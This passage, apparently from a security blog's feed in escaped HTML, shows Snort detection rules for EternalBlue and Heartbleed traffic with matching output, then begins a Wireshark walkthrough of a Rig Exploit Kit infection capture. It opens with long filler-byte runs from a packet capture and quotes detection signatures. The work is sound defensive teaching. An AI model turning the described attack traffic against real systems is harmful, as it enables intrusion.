AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, we can also find the same traffic.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/eternal.png&quot; title=&quot;snort/eternal.png&quot; alt=&quot;snort/eternal.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;→ There is a high possibility of attacker mounted an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Eternal Blue BoF&lt;/code&gt; exploit against a SMB service.&lt;/p&gt;

&lt;p&gt;Generally, the rule is written based on the following characteristics in the traffic:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Destination port: 445.&lt;/li&gt;
  &lt;li&gt;Content: lots of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; letters.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert tcp any any -&amp;gt; 192.168.1.0/24 445 (msg:&quot;Possible Eternal Blue BoF detect!&quot;; content:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;; sid:10000002; rev:3;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eternal.pcap&lt;/code&gt; traffic, we’re able to detect the BoF attack.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/rules/local.rules &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; eternalblue.pcap &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none
...
02/22-22:13:34.463024  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
02/22-22:13:34.463414  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
02/22-22:13:34.487892  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
02/22-22:13:34.488099  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;The switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-k&lt;/code&gt; is to disable checksum.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;detect-heartbleed-with-snort&quot;&gt;&lt;strong&gt;Detect Heartbleed with Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hearbleed&lt;/code&gt; is generally an attack sending a crafted payload with the &lt;strong&gt;payload length&lt;/strong&gt; &amp;gt; &lt;strong&gt;actual payload length&lt;/strong&gt; for a purpose of leaking memory data.&lt;/p&gt;

&lt;p&gt;It’s worth noticing that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbleed&lt;/code&gt; doesn’t have a specific pattern as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Eternal Blue&lt;/code&gt; we saw previously. However, to mount the attack, the communication protocols mainly used are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbeat Request/Response&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/heartbeat_req.png&quot; title=&quot;snort/heartbeat_req.png&quot; alt=&quot;snort/heartbeat_req.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;This is also where the data is leaked.&lt;/p&gt;

&lt;p&gt;Let’s us further analyze the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hearbeat Message (Request)&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/hb_req.png&quot; title=&quot;snort/hb_req.png&quot; alt=&quot;snort/hb_req.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The output demonstrates two important information:&lt;/p&gt;

&lt;p&gt;→ &lt;strong&gt;&lt;em&gt;The actual length of payload is&lt;/em&gt;&lt;/strong&gt;: 0 byte&lt;/p&gt;

&lt;p&gt;→ &lt;strong&gt;&lt;em&gt;The crafted length is&lt;/em&gt;&lt;/strong&gt;: 16386 bytes&lt;/p&gt;

&lt;p&gt;Therefore, the packet is spotted as abnormality.&lt;/p&gt;

&lt;p&gt;Now, to write a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbleed&lt;/code&gt; rule, we might rely on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbeat&lt;/code&gt; protocol and the port 443.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/hb_hex.png&quot; title=&quot;snort/hb_hex.png&quot; alt=&quot;snort/hb_hex.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;More explanations of the above image:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Color&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Hex&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Meaning&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Yello&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;Content-Type: Heartbeat&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Red&lt;/td&gt;
      &lt;td&gt;03 02 00&lt;/td&gt;
      &lt;td&gt;Version: TLS 1.1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Putting everything together, our Snort rule is:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert tcp any any -&amp;gt; 172.16.121.0/24 443 (msg:&quot;Possible Heartbleed detect!&quot;; content:&quot;|18 03 02 00|&quot;; rawbytes;sid:10000003; rev:1;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Applying the rule against the traffic, we successfully expose the attack.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/rules/local.rules &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; PCAPs/heart.pcap
04/16-12:00:41.512593  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000003:1] Possible Heartbleed detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 172.16.121.1:64667 -&amp;gt; 172.16.121.150:443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are far more advanced Snort rules, the aboves are just some basic of Snort. We probably want to write more complex rules in the future posts with Snort.&lt;/p&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="defense" /><category term="snort" /><summary type="html">Overview In this post, we will focus on writing Snort rules to detect real-world attacks based on inspecting and analyzing malicious traffic.</summary></entry><entry><title type="html">Rig Exploit Kit - Traffic Analysis</title><link href="https://jayngng.github.io/blog/ek-traffic-analysis/" rel="alternate" type="text/html" title="Rig Exploit Kit - Traffic Analysis" /><published>2021-09-12T03:50:39+10:00</published><updated>2021-09-12T03:50:39+10:00</updated><id>https://jayngng.github.io/blog/ek---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/ek-traffic-analysis/">&lt;h2 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this post, we’ll inspect malicious traffics with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;. Furthermore, we deeply analyze how threat actors utilize &lt;strong&gt;Exploit Kit (EK)&lt;/strong&gt; to mount multiple &lt;strong&gt;Client-Side exploitation&lt;/strong&gt; attacks on the network.&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;&lt;em&gt;PCAP packet&lt;/em&gt;&lt;/strong&gt; can be downloaded &lt;a href=&quot;https://www.malware-traffic-analysis.net/2014/11/16/2014-11-16-traffic-analysis-exercise.pcap.zip&quot;&gt;here&lt;/a&gt;!.&lt;/p&gt;

&lt;p&gt;( &lt;strong&gt;Note&lt;/strong&gt;: The password for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;. )&lt;/p&gt;

&lt;p&gt;( &lt;strong&gt;Credit&lt;/strong&gt;: &lt;a href=&quot;www.malware-traffic-analysis.net&quot;&gt;www.malware-traffic-analysis.net&lt;/a&gt; )&lt;/p&gt;

&lt;h4 id=&quot;table-of-content&quot;&gt;&lt;strong&gt;Table of Content&lt;/strong&gt;&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Traffic overview&lt;/strong&gt; → Establish a general idea of what traffic we’re looking at.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Q&amp;amp;A&lt;/strong&gt; → Answers the questions in this &lt;a href=&quot;https://www.malware-traffic-analysis.net/2014/11/16/index.html&quot;&gt;page.&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;traffic-overview&quot;&gt;&lt;strong&gt;Traffic Overview&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;This phase is conducted to help us better comprehend the traffic environment we’re working on …&lt;/p&gt;

&lt;h4 id=&quot;protocol-hierarchy&quot;&gt;&lt;strong&gt;Protocol Hierarchy&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Open the packet with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, we then navigate to &lt;strong&gt;&lt;em&gt;Statistics → Protocol Hierarchy&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/protocol_hierarchy.png&quot; title=&quot;ek1_ma/protocol_hierarchy.png&quot; alt=&quot;ek1_ma/protocol_hierarchy.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The output indicates most of the traffic occurs via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; protocol. Hence, we’ll drop our attention toward this protocol in the upcoming investigations.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ipv4-addresses&quot;&gt;&lt;strong&gt;IPv4 addresses&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Let’s us move on and inspect the &lt;strong&gt;unique IPv4 addresses&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, we go to:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Statistics → IPv4 Statistics → All Addresses&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/ipv4_addresses.png&quot; title=&quot;ek1_ma/ipv4_addresses.png&quot; alt=&quot;ek1_ma/ipv4_addresses.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;There are &lt;strong&gt;four highlighed IP addresses&lt;/strong&gt; due to the &lt;strong&gt;high percent&lt;/strong&gt; of them engaging in the traffic.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;We also notice that there are &lt;strong&gt;two ip addresses&lt;/strong&gt; standing out extremely doubtful:&lt;/p&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;em&gt;37.200.69.143&lt;/em&gt; → ~50%&lt;/li&gt;
      &lt;li&gt;&lt;em&gt;172.16.165.165&lt;/em&gt; → 100%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s keep them in mind since they might be useful for further analyses.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;resolved-address&quot;&gt;&lt;strong&gt;Resolved Address&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Now, we continue looking at the &lt;strong&gt;Resolved Addresses&lt;/strong&gt;. In orther words, they are domain names of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; web applications.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Statistics → Resolved Addresses → Hosts (instead of All entries)&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The below image will best illustrate the idea.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/dns.png&quot; title=&quot;ek1_ma/dns.png&quot; alt=&quot;ek1_ma/dns.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;It’s worth noticing that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.google.com&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.com&lt;/code&gt; are trusted domains.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;That said, it’s trivial to investigate those domains unless the attacker manages to compromise either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Google&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt;, which I believe is not the case in this engagement.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;virus-total&quot;&gt;&lt;strong&gt;Virus Total&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Finally, we upload the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; file onto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirusTotal&lt;/code&gt; to potentially detect the attack classification.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/virustotal.png&quot; title=&quot;ek1_ma/virustotal.png&quot; alt=&quot;ek1_ma/virustotal.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The result implies that we might be dealing with a &lt;strong&gt;Client-Side Exploitation&lt;/strong&gt; attack abusing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rig EK&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: More info of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rig EK&lt;/code&gt; can be found &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2018/05/deep-dive-into-rig-exploit-kit-delivering-grobios-trojan.html&quot;&gt;here.&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;qa&quot;&gt;&lt;strong&gt;Q&amp;amp;A&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this session, we will conduct the analyses by following along with the &lt;a href=&quot;https://www.malware-traffic-analysis.net/2014/11/16/index.html&quot;&gt;Questions.&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;level-1&quot;&gt;&lt;strong&gt;Level 1&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;1) What is the IP address of the Windows VM that gets infected?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.165.165&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.x.x&lt;/code&gt; is belonged to the private ip address range.&lt;/li&gt;
  &lt;li&gt;As we conduct the investigation, the IP address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.165.165&lt;/code&gt; is known fully involving in all communication over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; protocol.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/1_ans.png&quot; title=&quot;ek1_ma/1_ans.png&quot; alt=&quot;ek1_ma/1_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Therefore, we can safely assume that it is the victim.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;2) What is the host name of the Windows VM that gets infected?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;K34EN6W3N-PC&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, we either search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nbns&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;[1]. With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt;, we can do as the following:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/1_2_ans.png&quot; title=&quot;ek1_ma/1_2_ans.png&quot; alt=&quot;ek1_ma/1_2_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;[2]. With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nbns&lt;/code&gt;, we simply type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nbns&lt;/code&gt; in the search bar.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/1_2_nbns.png&quot; title=&quot;ek1_ma/1_2_nbns.png&quot; alt=&quot;ek1_ma/1_2_nbns.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;3) What is the MAC address of the infected VM?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f0:19:af:02:9b:f1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Previously, we found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MAC&lt;/code&gt; address while looking for machine host name.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;4) What is the IP address of the compromised web site?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;82.150.140.30&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;5) What is the domain name of the compromised web site?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.ciniholland.nl&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain (Q4 &amp;amp; Q5)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Now, let’s us examine the requests made by the victim at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.165.165&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/1_4_ans.png&quot; title=&quot;ek1_ma/1_4_ans.png&quot; alt=&quot;ek1_ma/1_4_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.ciniholland.nl&lt;/code&gt; was the first web site that victim navigated to.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
